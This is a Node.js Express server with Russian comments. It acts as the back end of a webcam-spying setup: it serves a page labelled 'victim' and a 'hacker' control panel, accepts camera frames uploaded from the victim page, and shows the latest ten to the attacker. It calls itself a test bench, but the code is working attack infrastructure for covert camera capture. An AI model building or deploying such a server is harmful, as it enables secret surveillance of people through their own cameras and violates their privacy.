const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();
const PORT = 3000;

// Хранилище кадров в памяти (так как диск только для чтения)
let latestFrames = [];

// Настройка лимитов и парсинга JSON
app.use(express.json({ limit: '10mb' }));

// Отдаем главную страницу (Жертва)
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Отдаем страницу хакера (Панель управления)
app.get('/hacker', (req, res) => {
    res.sendFile(path.join(__dirname, 'hacker.html'));
});

// Эндпоинт для получения списка кадров
app.get('/latest-frames', (req, res) => {
    res.set('Cache-Control', 'no-store'); // Запрещаем кэширование
    res.json(latestFrames);
});
// Эндпоинт для получения кадров с камеры
app.post('/upload', (req, res) => {
    const imageData = req.body.image;
    if (!imageData) return res.sendStatus(400);

    // Сохраняем в память
    const newFrame = {
        image: imageData,
        time: new Date().toLocaleTimeString()
    };

    latestFrames.push(newFrame);
    
    // Ограничиваем список последними 10 кадрами
    if (latestFrames.length > 10) {
        latestFrames.shift();
    }

    console.log(`[!] [${newFrame.time}] Получен новый кадр (размер: ${Math.round(imageData.length / 1024)} KB)`);
    res.status(200).send({ status: 'ok' });
});app.listen(PORT, () => {
    console.log(`[SERVER] Стенд запущен на http://localhost:${PORT}`);
    console.log(`[SERVER] Фото сохраняются в папку: ${path.join(__dirname, 'captures')}`);
});
